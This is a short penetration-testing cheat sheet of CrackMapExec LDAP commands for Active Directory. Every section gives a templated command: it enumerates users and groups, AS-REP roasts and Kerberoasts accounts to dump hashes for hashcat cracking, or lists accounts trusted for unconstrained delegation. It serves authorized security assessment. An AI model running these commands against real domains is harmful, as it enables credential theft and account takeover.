# cme (LDAP)

% cme, crackmapexec, Active Directory, nxc, netexec, ldap

## Enumerate users descriptions
#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user 

```bash
cme ldap <dc-ip> -u <user> -p <password> -M get-desc-users
```

## Enumerate domain groups
#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user

```bash
cme ldap <dc-ip> -u <user> -p <password> --groups
```

## ASREPRoast enum without authentication
#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Anonymous 

User can be a wordlist too (user.txt)
Hashcat format  -m 18200 

```bash
cme ldap <ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc-ip>
```

## ASREPRoast enum with authentication
#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user

Hashcat format  -m 18200 

```bash
cme ldap <ip> -u <user> -p <password> --asreproast ASREProastables.txt --kdcHost <dc-ip>
```

## Kerberoasting
#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user 

Hashcat format  -m 13100

```bash
cme ldap <ip> -u <user> -p <password> --kerberoasting kerberoastables.txt --kdcHost <dc-ip>
```

## Unconstrained delegation
#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user 

List of all computers and users with the flag TRUSTED_FOR_DELEGATION.

```bash
cme ldap <ip> -u <user> -p <password> --trusted-for-delegation
```
